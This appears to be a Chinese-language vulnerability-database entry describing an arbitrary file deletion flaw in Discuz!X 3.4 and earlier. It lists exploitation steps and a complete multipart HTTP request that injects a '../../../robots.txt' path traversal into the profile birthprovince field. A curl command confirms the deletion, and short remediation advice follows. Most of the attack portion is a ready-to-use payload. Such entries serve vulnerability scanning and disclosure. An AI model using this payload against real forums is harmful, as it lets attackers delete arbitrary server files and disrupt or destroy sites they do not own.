---
id: DISCUZ-X3.4-ARBITRARY-FILE-DELETION
title: Discuz!X 任意文件删除漏洞
product: discuz
vendor: Discuz
version_affected: "<=3.4"
severity: MEDIUM
tags: [file_delete, 需要认证]
fingerprint: ["Discuz", "论坛"]
---

## 漏洞描述

Discuz!X 3.4及以下版本中，用户资料修改功能存在任意文件删除漏洞。攻击者可通过修改个人资料的出生地字段构造路径穿越，删除服务器任意文件。

## 影响版本

- Discuz!X <= 3.4

## 前置条件

- 需要注册用户账户
- 需要获取formhash值

## 利用步骤

1. 注册账户并获取formhash
2. 修改个人资料，出生地字段写入路径穿越
3. 上传普通图片触发文件删除

## Payload

```http
POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1
Host: target
Cookie: [your_cookie]
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPFvXyxL45f34L12s

------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="formhash"

[your_formhash]
------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="birthprovince"

../../../robots.txt
------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="profilesubmit"

1
------WebKitFormBoundaryPFvXyxL45f34L12s--
```

## 验证方法

```bash
# 检查文件是否被删除
curl "http://target/robots.txt"
# 应返回404
```

## 修复建议

1. 升级Discuz至最新版本
2. 过滤文件路径中的`../`
3. 限制用户资料字段的特殊字符
